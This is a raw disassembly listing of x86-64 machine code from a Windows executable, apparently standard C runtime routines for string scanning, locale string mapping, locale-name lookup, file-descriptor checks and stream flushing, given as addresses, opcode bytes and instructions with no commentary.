   1400086e8:	0f b6 4c 14 20       	movzbl 0x20(%rsp,%rdx,1),%ecx
   1400086ed:	0f ab c1             	bts    %eax,%ecx
   1400086f0:	49 ff c1             	inc    %r9
   1400086f3:	88 4c 14 20          	mov    %cl,0x20(%rsp,%rdx,1)
   1400086f7:	41 8a 01             	mov    (%r9),%al
   1400086fa:	84 c0                	test   %al,%al
   1400086fc:	75 dd                	jne    0x1400086db
   1400086fe:	eb 1f                	jmp    0x14000871f
   140008700:	41 0f b6 c1          	movzbl %r9b,%eax
   140008704:	ba 01 00 00 00       	mov    $0x1,%edx
   140008709:	41 0f b6 c9          	movzbl %r9b,%ecx
   14000870d:	83 e1 07             	and    $0x7,%ecx
   140008710:	48 c1 e8 03          	shr    $0x3,%rax
   140008714:	d3 e2                	shl    %cl,%edx
   140008716:	84 54 04 20          	test   %dl,0x20(%rsp,%rax,1)
   14000871a:	75 1f                	jne    0x14000873b
   14000871c:	49 ff c0             	inc    %r8
   14000871f:	45 8a 08             	mov    (%r8),%r9b
   140008722:	45 84 c9             	test   %r9b,%r9b
   140008725:	75 d9                	jne    0x140008700
   140008727:	33 c0                	xor    %eax,%eax
   140008729:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   14000872e:	48 33 cc             	xor    %rsp,%rcx
   140008731:	e8 6a 93 ff ff       	call   0x140001aa0
   140008736:	48 83 c4 58          	add    $0x58,%rsp
   14000873a:	c3                   	ret
   14000873b:	49 8b c0             	mov    %r8,%rax
   14000873e:	eb e9                	jmp    0x140008729
   140008740:	e8 17 9b ff ff       	call   0x14000225c
   140008745:	cc                   	int3
   140008746:	90                   	nop
   140008747:	90                   	nop
   140008748:	45 33 c0             	xor    %r8d,%r8d
   14000874b:	eb 03                	jmp    0x140008750
   14000874d:	90                   	nop
   14000874e:	90                   	nop
   14000874f:	90                   	nop
   140008750:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008755:	57                   	push   %rdi
   140008756:	48 83 ec 40          	sub    $0x40,%rsp
   14000875a:	48 8b da             	mov    %rdx,%rbx
   14000875d:	48 8b f9             	mov    %rcx,%rdi
   140008760:	48 85 c9             	test   %rcx,%rcx
   140008763:	75 14                	jne    0x140008779
   140008765:	e8 86 c5 ff ff       	call   0x140004cf0
   14000876a:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140008770:	e8 5b c4 ff ff       	call   0x140004bd0
   140008775:	33 c0                	xor    %eax,%eax
   140008777:	eb 62                	jmp    0x1400087db
   140008779:	48 85 d2             	test   %rdx,%rdx
   14000877c:	74 e7                	je     0x140008765
   14000877e:	48 3b ca             	cmp    %rdx,%rcx
   140008781:	73 f2                	jae    0x140008775
   140008783:	49 8b d0             	mov    %r8,%rdx
   140008786:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000878b:	e8 20 c1 ff ff       	call   0x1400048b0
   140008790:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140008795:	83 79 08 00          	cmpl   $0x0,0x8(%rcx)
   140008799:	75 05                	jne    0x1400087a0
   14000879b:	48 ff cb             	dec    %rbx
   14000879e:	eb 25                	jmp    0x1400087c5
   1400087a0:	48 8d 53 ff          	lea    -0x1(%rbx),%rdx
   1400087a4:	48 ff ca             	dec    %rdx
   1400087a7:	48 3b fa             	cmp    %rdx,%rdi
   1400087aa:	77 0a                	ja     0x1400087b6
   1400087ac:	0f b6 02             	movzbl (%rdx),%eax
   1400087af:	f6 44 08 19 04       	testb  $0x4,0x19(%rax,%rcx,1)
   1400087b4:	75 ee                	jne    0x1400087a4
   1400087b6:	48 8b cb             	mov    %rbx,%rcx
   1400087b9:	48 2b ca             	sub    %rdx,%rcx
   1400087bc:	83 e1 01             	and    $0x1,%ecx
   1400087bf:	48 2b d9             	sub    %rcx,%rbx
   1400087c2:	48 ff cb             	dec    %rbx
   1400087c5:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   1400087ca:	74 0c                	je     0x1400087d8
   1400087cc:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1400087d1:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   1400087d8:	48 8b c3             	mov    %rbx,%rax
   1400087db:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400087e0:	48 83 c4 40          	add    $0x40,%rsp
   1400087e4:	5f                   	pop    %rdi
   1400087e5:	c3                   	ret
   1400087e6:	90                   	nop
   1400087e7:	90                   	nop
   1400087e8:	48 83 ec 28          	sub    $0x28,%rsp
   1400087ec:	e8 fb d6 ff ff       	call   0x140005eec
   1400087f1:	33 c9                	xor    %ecx,%ecx
   1400087f3:	84 c0                	test   %al,%al
   1400087f5:	0f 94 c1             	sete   %cl
   1400087f8:	8b c1                	mov    %ecx,%eax
   1400087fa:	48 83 c4 28          	add    $0x28,%rsp
   1400087fe:	c3                   	ret
   1400087ff:	90                   	nop
   140008800:	55                   	push   %rbp
   140008801:	41 54                	push   %r12
   140008803:	41 55                	push   %r13
   140008805:	41 56                	push   %r14
   140008807:	41 57                	push   %r15
   140008809:	48 83 ec 60          	sub    $0x60,%rsp
   14000880d:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   140008812:	48 89 5d 40          	mov    %rbx,0x40(%rbp)
   140008816:	48 89 75 48          	mov    %rsi,0x48(%rbp)
   14000881a:	48 89 7d 50          	mov    %rdi,0x50(%rbp)
   14000881e:	48 8b 05 f3 c7 00 00 	mov    0xc7f3(%rip),%rax        # 0x140015018
   140008825:	48 33 c5             	xor    %rbp,%rax
   140008828:	48 89 45 08          	mov    %rax,0x8(%rbp)
   14000882c:	48 63 5d 60          	movslq 0x60(%rbp),%rbx
   140008830:	4d 8b f9             	mov    %r9,%r15
   140008833:	48 89 55 00          	mov    %rdx,0x0(%rbp)
   140008837:	45 8b e8             	mov    %r8d,%r13d
   14000883a:	48 8b f9             	mov    %rcx,%rdi
   14000883d:	85 db                	test   %ebx,%ebx
   14000883f:	7e 14                	jle    0x140008855
   140008841:	48 8b d3             	mov    %rbx,%rdx
   140008844:	49 8b c9             	mov    %r9,%rcx
   140008847:	e8 ec 07 00 00       	call   0x140009038
   14000884c:	3b c3                	cmp    %ebx,%eax
   14000884e:	8d 58 01             	lea    0x1(%rax),%ebx
   140008851:	7c 02                	jl     0x140008855
   140008853:	8b d8                	mov    %eax,%ebx
   140008855:	44 8b 75 78          	mov    0x78(%rbp),%r14d
   140008859:	45 85 f6             	test   %r14d,%r14d
   14000885c:	75 07                	jne    0x140008865
   14000885e:	48 8b 07             	mov    (%rdi),%rax
   140008861:	44 8b 70 0c          	mov    0xc(%rax),%r14d
   140008865:	f7 9d 80 00 00 00    	negl   0x80(%rbp)
   14000886b:	44 8b cb             	mov    %ebx,%r9d
   14000886e:	4d 8b c7             	mov    %r15,%r8
   140008871:	41 8b ce             	mov    %r14d,%ecx
   140008874:	1b d2                	sbb    %edx,%edx
   140008876:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000887b:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140008881:	83 e2 08             	and    $0x8,%edx
   140008884:	ff c2                	inc    %edx
   140008886:	ff 15 ec 38 00 00    	call   *0x38ec(%rip)        # 0x14000c178
   14000888c:	4c 63 e0             	movslq %eax,%r12
   14000888f:	85 c0                	test   %eax,%eax
   140008891:	0f 84 7b 02 00 00    	je     0x140008b12
   140008897:	49 8b d4             	mov    %r12,%rdx
   14000889a:	49 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%r8
   1400088a1:	ff ff 0f 
   1400088a4:	48 03 d2             	add    %rdx,%rdx
   1400088a7:	48 8d 4a 10          	lea    0x10(%rdx),%rcx
   1400088ab:	48 3b d1             	cmp    %rcx,%rdx
   1400088ae:	48 1b c0             	sbb    %rax,%rax
   1400088b1:	48 85 c1             	test   %rax,%rcx
   1400088b4:	74 72                	je     0x140008928
   1400088b6:	48 8d 4a 10          	lea    0x10(%rdx),%rcx
   1400088ba:	48 3b d1             	cmp    %rcx,%rdx
   1400088bd:	48 1b c0             	sbb    %rax,%rax
   1400088c0:	48 23 c1             	and    %rcx,%rax
   1400088c3:	48 3d 00 04 00 00    	cmp    $0x400,%rax
   1400088c9:	48 8d 42 10          	lea    0x10(%rdx),%rax
   1400088cd:	77 37                	ja     0x140008906
   1400088cf:	48 3b d0             	cmp    %rax,%rdx
   1400088d2:	48 1b c9             	sbb    %rcx,%rcx
   1400088d5:	48 23 c8             	and    %rax,%rcx
   1400088d8:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   1400088dc:	48 3b c1             	cmp    %rcx,%rax
   1400088df:	77 03                	ja     0x1400088e4
   1400088e1:	49 8b c0             	mov    %r8,%rax
   1400088e4:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   1400088e8:	e8 53 2b 00 00       	call   0x14000b440
   1400088ed:	48 2b e0             	sub    %rax,%rsp
   1400088f0:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi
   1400088f5:	48 85 f6             	test   %rsi,%rsi
   1400088f8:	0f 84 fa 01 00 00    	je     0x140008af8
   1400088fe:	c7 06 cc cc 00 00    	movl   $0xcccc,(%rsi)
   140008904:	eb 1c                	jmp    0x140008922
   140008906:	48 3b d0             	cmp    %rax,%rdx
   140008909:	48 1b c9             	sbb    %rcx,%rcx
   14000890c:	48 23 c8             	and    %rax,%rcx
   14000890f:	e8 6c be ff ff       	call   0x140004780
   140008914:	48 8b f0             	mov    %rax,%rsi
   140008917:	48 85 c0             	test   %rax,%rax
   14000891a:	74 0e                	je     0x14000892a
   14000891c:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   140008922:	48 83 c6 10          	add    $0x10,%rsi
   140008926:	eb 02                	jmp    0x14000892a
   140008928:	33 f6                	xor    %esi,%esi
   14000892a:	48 85 f6             	test   %rsi,%rsi
   14000892d:	0f 84 c5 01 00 00    	je     0x140008af8
   140008933:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   140008938:	44 8b cb             	mov    %ebx,%r9d
   14000893b:	4d 8b c7             	mov    %r15,%r8
   14000893e:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140008943:	ba 01 00 00 00       	mov    $0x1,%edx
   140008948:	41 8b ce             	mov    %r14d,%ecx
   14000894b:	ff 15 27 38 00 00    	call   *0x3827(%rip)        # 0x14000c178
   140008951:	85 c0                	test   %eax,%eax
   140008953:	0f 84 9f 01 00 00    	je     0x140008af8
   140008959:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   14000895f:	45 8b cc             	mov    %r12d,%r9d
   140008962:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140008968:	4c 8b c6             	mov    %rsi,%r8
   14000896b:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140008971:	41 8b d5             	mov    %r13d,%edx
   140008974:	4c 8b 7d 00          	mov    0x0(%rbp),%r15
   140008978:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000897d:	49 8b cf             	mov    %r15,%rcx
   140008980:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140008986:	e8 e9 de ff ff       	call   0x140006874
   14000898b:	48 63 f8             	movslq %eax,%rdi
   14000898e:	85 c0                	test   %eax,%eax
   140008990:	0f 84 62 01 00 00    	je     0x140008af8
   140008996:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   14000899c:	45 85 e8             	test   %r13d,%r8d
   14000899f:	74 52                	je     0x1400089f3
   1400089a1:	8b 45 70             	mov    0x70(%rbp),%eax
   1400089a4:	85 c0                	test   %eax,%eax
   1400089a6:	0f 84 4e 01 00 00    	je     0x140008afa
   1400089ac:	3b f8                	cmp    %eax,%edi
   1400089ae:	0f 8f 44 01 00 00    	jg     0x140008af8
   1400089b4:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   1400089ba:	45 8b cc             	mov    %r12d,%r9d
   1400089bd:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   1400089c3:	4c 8b c6             	mov    %rsi,%r8
   1400089c6:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   1400089cc:	41 8b d5             	mov    %r13d,%edx
   1400089cf:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400089d3:	49 8b cf             	mov    %r15,%rcx
   1400089d6:	48 8b 45 68          	mov    0x68(%rbp),%rax
   1400089da:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400089df:	e8 90 de ff ff       	call   0x140006874
   1400089e4:	8b f8                	mov    %eax,%edi
   1400089e6:	85 c0                	test   %eax,%eax
   1400089e8:	0f 85 0c 01 00 00    	jne    0x140008afa
   1400089ee:	e9 05 01 00 00       	jmp    0x140008af8
   1400089f3:	48 8b d7             	mov    %rdi,%rdx
   1400089f6:	48 03 d2             	add    %rdx,%rdx
   1400089f9:	48 8d 4a 10          	lea    0x10(%rdx),%rcx
   1400089fd:	48 3b d1             	cmp    %rcx,%rdx
   140008a00:	48 1b c0             	sbb    %rax,%rax
   140008a03:	48 85 c1             	test   %rax,%rcx
   140008a06:	74 76                	je     0x140008a7e
   140008a08:	48 8d 4a 10          	lea    0x10(%rdx),%rcx
   140008a0c:	48 3b d1             	cmp    %rcx,%rdx
   140008a0f:	48 1b c0             	sbb    %rax,%rax
   140008a12:	48 23 c1             	and    %rcx,%rax
   140008a15:	49 3b c0             	cmp    %r8,%rax
   140008a18:	48 8d 42 10          	lea    0x10(%rdx),%rax
   140008a1c:	77 3e                	ja     0x140008a5c
   140008a1e:	48 3b d0             	cmp    %rax,%rdx
   140008a21:	48 1b c9             	sbb    %rcx,%rcx
   140008a24:	48 23 c8             	and    %rax,%rcx
   140008a27:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   140008a2b:	48 3b c1             	cmp    %rcx,%rax
   140008a2e:	77 0a                	ja     0x140008a3a
   140008a30:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   140008a37:	ff ff 0f 
   140008a3a:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   140008a3e:	e8 fd 29 00 00       	call   0x14000b440
   140008a43:	48 2b e0             	sub    %rax,%rsp
   140008a46:	48 8d 5c 24 50       	lea    0x50(%rsp),%rbx
   140008a4b:	48 85 db             	test   %rbx,%rbx
   140008a4e:	0f 84 a4 00 00 00    	je     0x140008af8
   140008a54:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   140008a5a:	eb 1c                	jmp    0x140008a78
   140008a5c:	48 3b d0             	cmp    %rax,%rdx
   140008a5f:	48 1b c9             	sbb    %rcx,%rcx
   140008a62:	48 23 c8             	and    %rax,%rcx
   140008a65:	e8 16 bd ff ff       	call   0x140004780
   140008a6a:	48 8b d8             	mov    %rax,%rbx
   140008a6d:	48 85 c0             	test   %rax,%rax
   140008a70:	74 0e                	je     0x140008a80
   140008a72:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   140008a78:	48 83 c3 10          	add    $0x10,%rbx
   140008a7c:	eb 02                	jmp    0x140008a80
   140008a7e:	33 db                	xor    %ebx,%ebx
   140008a80:	48 85 db             	test   %rbx,%rbx
   140008a83:	74 73                	je     0x140008af8
   140008a85:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   140008a8b:	45 8b cc             	mov    %r12d,%r9d
   140008a8e:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140008a94:	4c 8b c6             	mov    %rsi,%r8
   140008a97:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140008a9d:	41 8b d5             	mov    %r13d,%edx
   140008aa0:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   140008aa4:	49 8b cf             	mov    %r15,%rcx
   140008aa7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140008aac:	e8 c3 dd ff ff       	call   0x140006874
   140008ab1:	85 c0                	test   %eax,%eax
   140008ab3:	74 32                	je     0x140008ae7
   140008ab5:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140008abb:	33 d2                	xor    %edx,%edx
   140008abd:	48 21 54 24 30       	and    %rdx,0x30(%rsp)
   140008ac2:	44 8b cf             	mov    %edi,%r9d
   140008ac5:	8b 45 70             	mov    0x70(%rbp),%eax
   140008ac8:	4c 8b c3             	mov    %rbx,%r8
   140008acb:	41 8b ce             	mov    %r14d,%ecx
   140008ace:	85 c0                	test   %eax,%eax
   140008ad0:	75 66                	jne    0x140008b38
   140008ad2:	21 54 24 28          	and    %edx,0x28(%rsp)
   140008ad6:	48 21 54 24 20       	and    %rdx,0x20(%rsp)
   140008adb:	ff 15 9f 36 00 00    	call   *0x369f(%rip)        # 0x14000c180
   140008ae1:	8b f8                	mov    %eax,%edi
   140008ae3:	85 c0                	test   %eax,%eax
   140008ae5:	75 60                	jne    0x140008b47
   140008ae7:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   140008aeb:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   140008af1:	75 05                	jne    0x140008af8
   140008af3:	e8 48 bc ff ff       	call   0x140004740
   140008af8:	33 ff                	xor    %edi,%edi
   140008afa:	48 85 f6             	test   %rsi,%rsi
   140008afd:	74 11                	je     0x140008b10
   140008aff:	48 8d 4e f0          	lea    -0x10(%rsi),%rcx
   140008b03:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   140008b09:	75 05                	jne    0x140008b10
   140008b0b:	e8 30 bc ff ff       	call   0x140004740
   140008b10:	8b c7                	mov    %edi,%eax
   140008b12:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   140008b16:	48 33 cd             	xor    %rbp,%rcx
   140008b19:	e8 82 8f ff ff       	call   0x140001aa0
   140008b1e:	48 8b 5d 40          	mov    0x40(%rbp),%rbx
   140008b22:	48 8b 75 48          	mov    0x48(%rbp),%rsi
   140008b26:	48 8b 7d 50          	mov    0x50(%rbp),%rdi
   140008b2a:	48 8d 65 10          	lea    0x10(%rbp),%rsp
   140008b2e:	41 5f                	pop    %r15
   140008b30:	41 5e                	pop    %r14
   140008b32:	41 5d                	pop    %r13
   140008b34:	41 5c                	pop    %r12
   140008b36:	5d                   	pop    %rbp
   140008b37:	c3                   	ret
   140008b38:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140008b3c:	48 8b 45 68          	mov    0x68(%rbp),%rax
   140008b40:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140008b45:	eb 94                	jmp    0x140008adb
   140008b47:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   140008b4b:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   140008b51:	75 a7                	jne    0x140008afa
   140008b53:	e8 e8 bb ff ff       	call   0x140004740
   140008b58:	eb a0                	jmp    0x140008afa
   140008b5a:	90                   	nop
   140008b5b:	90                   	nop
   140008b5c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008b61:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140008b66:	57                   	push   %rdi
   140008b67:	48 83 ec 70          	sub    $0x70,%rsp
   140008b6b:	48 8b f2             	mov    %rdx,%rsi
   140008b6e:	49 8b d9             	mov    %r9,%rbx
   140008b71:	48 8b d1             	mov    %rcx,%rdx
   140008b74:	41 8b f8             	mov    %r8d,%edi
   140008b77:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140008b7c:	e8 2f bd ff ff       	call   0x1400048b0
   140008b81:	8b 84 24 c0 00 00 00 	mov    0xc0(%rsp),%eax
   140008b88:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140008b8d:	89 44 24 40          	mov    %eax,0x40(%rsp)
   140008b91:	4c 8b cb             	mov    %rbx,%r9
   140008b94:	8b 84 24 b8 00 00 00 	mov    0xb8(%rsp),%eax
   140008b9b:	44 8b c7             	mov    %edi,%r8d
   140008b9e:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140008ba2:	48 8b d6             	mov    %rsi,%rdx
   140008ba5:	8b 84 24 b0 00 00 00 	mov    0xb0(%rsp),%eax
   140008bac:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140008bb0:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   140008bb7:	00 
   140008bb8:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140008bbd:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   140008bc4:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140008bc8:	e8 33 fc ff ff       	call   0x140008800
   140008bcd:	80 7c 24 68 00       	cmpb   $0x0,0x68(%rsp)
   140008bd2:	74 0c                	je     0x140008be0
   140008bd4:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140008bd9:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   140008be0:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   140008be5:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140008be9:	49 8b 73 18          	mov    0x18(%r11),%rsi
   140008bed:	49 8b e3             	mov    %r11,%rsp
   140008bf0:	5f                   	pop    %rdi
   140008bf1:	c3                   	ret
   140008bf2:	90                   	nop
   140008bf3:	90                   	nop
   140008bf4:	48 8b c4             	mov    %rsp,%rax
   140008bf7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140008bfb:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140008bff:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140008c03:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140008c07:	41 56                	push   %r14
   140008c09:	33 ed                	xor    %ebp,%ebp
   140008c0b:	4c 8d 35 ce 69 00 00 	lea    0x69ce(%rip),%r14        # 0x14000f5e0
   140008c12:	44 8b d5             	mov    %ebp,%r10d
   140008c15:	48 8b f1             	mov    %rcx,%rsi
   140008c18:	41 bb e3 00 00 00    	mov    $0xe3,%r11d
   140008c1e:	43 8d 04 13          	lea    (%r11,%r10,1),%eax
   140008c22:	48 8b fe             	mov    %rsi,%rdi
   140008c25:	99                   	cltd
   140008c26:	bb 55 00 00 00       	mov    $0x55,%ebx
   140008c2b:	2b c2                	sub    %edx,%eax
   140008c2d:	d1 f8                	sar    $1,%eax
   140008c2f:	4c 63 c0             	movslq %eax,%r8
   140008c32:	49 8b c8             	mov    %r8,%rcx
   140008c35:	48 c1 e1 04          	shl    $0x4,%rcx
   140008c39:	4e 8b 0c 31          	mov    (%rcx,%r14,1),%r9
   140008c3d:	49 2b f9             	sub    %r9,%rdi
   140008c40:	42 0f b7 14 0f       	movzwl (%rdi,%r9,1),%edx
   140008c45:	8d 4a bf             	lea    -0x41(%rdx),%ecx
   140008c48:	66 83 f9 19          	cmp    $0x19,%cx
   140008c4c:	77 04                	ja     0x140008c52
   140008c4e:	66 83 c2 20          	add    $0x20,%dx
   140008c52:	41 0f b7 09          	movzwl (%r9),%ecx
   140008c56:	8d 41 bf             	lea    -0x41(%rcx),%eax
   140008c59:	66 83 f8 19          	cmp    $0x19,%ax
   140008c5d:	77 04                	ja     0x140008c63
   140008c5f:	66 83 c1 20          	add    $0x20,%cx
   140008c63:	49 83 c1 02          	add    $0x2,%r9
   140008c67:	48 83 eb 01          	sub    $0x1,%rbx
   140008c6b:	74 0a                	je     0x140008c77
   140008c6d:	66 85 d2             	test   %dx,%dx
   140008c70:	74 05                	je     0x140008c77
   140008c72:	66 3b d1             	cmp    %cx,%dx
   140008c75:	74 c9                	je     0x140008c40
   140008c77:	0f b7 c1             	movzwl %cx,%eax
   140008c7a:	0f b7 ca             	movzwl %dx,%ecx
   140008c7d:	2b c8                	sub    %eax,%ecx
   140008c7f:	74 18                	je     0x140008c99
   140008c81:	85 c9                	test   %ecx,%ecx
   140008c83:	79 06                	jns    0x140008c8b
   140008c85:	45 8d 58 ff          	lea    -0x1(%r8),%r11d
   140008c89:	eb 04                	jmp    0x140008c8f
   140008c8b:	45 8d 50 01          	lea    0x1(%r8),%r10d
   140008c8f:	45 3b d3             	cmp    %r11d,%r10d
   140008c92:	7e 8a                	jle    0x140008c1e
   140008c94:	83 c8 ff             	or     $0xffffffff,%eax
   140008c97:	eb 0b                	jmp    0x140008ca4
   140008c99:	49 8b c0             	mov    %r8,%rax
   140008c9c:	48 03 c0             	add    %rax,%rax
   140008c9f:	41 8b 44 c6 08       	mov    0x8(%r14,%rax,8),%eax
   140008ca4:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   140008ca9:	48 8b 6c 24 18       	mov    0x18(%rsp),%rbp
   140008cae:	48 8b 74 24 20       	mov    0x20(%rsp),%rsi
   140008cb3:	48 8b 7c 24 28       	mov    0x28(%rsp),%rdi
   140008cb8:	41 5e                	pop    %r14
   140008cba:	c3                   	ret
   140008cbb:	90                   	nop
   140008cbc:	48 83 ec 28          	sub    $0x28,%rsp
   140008cc0:	48 85 c9             	test   %rcx,%rcx
   140008cc3:	74 22                	je     0x140008ce7
   140008cc5:	e8 2a ff ff ff       	call   0x140008bf4
   140008cca:	85 c0                	test   %eax,%eax
   140008ccc:	78 19                	js     0x140008ce7
   140008cce:	48 98                	cltq
   140008cd0:	48 3d e4 00 00 00    	cmp    $0xe4,%rax
   140008cd6:	73 0f                	jae    0x140008ce7
   140008cd8:	48 03 c0             	add    %rax,%rax
   140008cdb:	48 8d 0d ae 4e 00 00 	lea    0x4eae(%rip),%rcx        # 0x14000db90
   140008ce2:	8b 04 c1             	mov    (%rcx,%rax,8),%eax
   140008ce5:	eb 02                	jmp    0x140008ce9
   140008ce7:	33 c0                	xor    %eax,%eax
   140008ce9:	48 83 c4 28          	add    $0x28,%rsp
   140008ced:	c3                   	ret
   140008cee:	90                   	nop
   140008cef:	90                   	nop
   140008cf0:	48 83 ec 28          	sub    $0x28,%rsp
   140008cf4:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   140008cf7:	75 0d                	jne    0x140008d06
   140008cf9:	e8 f2 bf ff ff       	call   0x140004cf0
   140008cfe:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140008d04:	eb 42                	jmp    0x140008d48
   140008d06:	85 c9                	test   %ecx,%ecx
   140008d08:	78 2e                	js     0x140008d38
   140008d0a:	3b 0d 00 dd 00 00    	cmp    0xdd00(%rip),%ecx        # 0x140016a10
   140008d10:	73 26                	jae    0x140008d38
   140008d12:	48 63 c9             	movslq %ecx,%rcx
   140008d15:	48 8d 15 f4 d8 00 00 	lea    0xd8f4(%rip),%rdx        # 0x140016610
   140008d1c:	48 8b c1             	mov    %rcx,%rax
   140008d1f:	83 e1 3f             	and    $0x3f,%ecx
   140008d22:	48 c1 f8 06          	sar    $0x6,%rax
   140008d26:	48 c1 e1 06          	shl    $0x6,%rcx
   140008d2a:	48 8b 04 c2          	mov    (%rdx,%rax,8),%rax
   140008d2e:	0f b6 44 08 38       	movzbl 0x38(%rax,%rcx,1),%eax
   140008d33:	83 e0 40             	and    $0x40,%eax
   140008d36:	eb 12                	jmp    0x140008d4a
   140008d38:	e8 b3 bf ff ff       	call   0x140004cf0
   140008d3d:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140008d43:	e8 88 be ff ff       	call   0x140004bd0
   140008d48:	33 c0                	xor    %eax,%eax
   140008d4a:	48 83 c4 28          	add    $0x28,%rsp
   140008d4e:	c3                   	ret
   140008d4f:	90                   	nop
   140008d50:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008d55:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140008d5a:	57                   	push   %rdi
   140008d5b:	48 83 ec 20          	sub    $0x20,%rsp
   140008d5f:	48 8b d9             	mov    %rcx,%rbx
   140008d62:	8b 41 14             	mov    0x14(%rcx),%eax
   140008d65:	24 03                	and    $0x3,%al
   140008d67:	3c 02                	cmp    $0x2,%al
   140008d69:	75 4a                	jne    0x140008db5
   140008d6b:	8b 41 14             	mov    0x14(%rcx),%eax
   140008d6e:	a8 c0                	test   $0xc0,%al
   140008d70:	74 43                	je     0x140008db5
   140008d72:	8b 39                	mov    (%rcx),%edi
   140008d74:	2b 79 08             	sub    0x8(%rcx),%edi
   140008d77:	83 61 10 00          	andl   $0x0,0x10(%rcx)
   140008d7b:	48 8b 71 08          	mov    0x8(%rcx),%rsi
   140008d7f:	48 89 31             	mov    %rsi,(%rcx)
   140008d82:	85 ff                	test   %edi,%edi
   140008d84:	7e 2f                	jle    0x140008db5
   140008d86:	e8 85 f2 ff ff       	call   0x140008010
   140008d8b:	8b c8                	mov    %eax,%ecx
   140008d8d:	44 8b c7             	mov    %edi,%r8d
   140008d90:	48 8b d6             	mov    %rsi,%rdx
   140008d93:	e8 78 09 00 00       	call   0x140009710
   140008d98:	3b f8                	cmp    %eax,%edi
   140008d9a:	74 0a                	je     0x140008da6
   140008d9c:	f0 83 4b 14 10       	lock orl $0x10,0x14(%rbx)
   140008da1:	83 c8 ff             	or     $0xffffffff,%eax
   140008da4:	eb 11                	jmp    0x140008db7
   140008da6:	8b 43 14             	mov    0x14(%rbx),%eax
   140008da9:	c1 e8 02             	shr    $0x2,%eax
   140008dac:	a8 01                	test   $0x1,%al
   140008dae:	74 05                	je     0x140008db5
   140008db0:	f0 83 63 14 fd       	lock andl $0xfffffffd,0x14(%rbx)
   140008db5:	33 c0                	xor    %eax,%eax
   140008db7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008dbc:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140008dc1:	48 83 c4 20          	add    $0x20,%rsp
   140008dc5:	5f                   	pop    %rdi
   140008dc6:	c3                   	ret
   140008dc7:	90                   	nop
   140008dc8:	53                   	push   %rbx
   140008dc9:	48 83 ec 20          	sub    $0x20,%rsp
